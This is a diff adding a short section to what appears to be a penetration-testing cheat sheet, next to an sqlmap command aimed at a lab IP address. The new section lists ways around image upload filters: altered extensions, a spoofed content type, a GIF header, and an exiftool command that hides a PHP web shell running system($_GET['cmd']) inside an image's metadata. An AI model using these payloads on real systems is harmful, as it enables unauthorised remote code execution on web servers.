@@ -597,6 +597,16 @@ sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admi
 - Attack
 - Check for response length variation
 
+### Bypass image upload restrictions
+
+```
+- Change extension: .pHp3 or pHp3.jpg
+- Modify mimetype: Content-type: image/jpeg
+- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
+- Add gif header: GIF89a;
+- All at the same time.
+```
+
 ## Password brute force - last resort
 
 Offline local resources
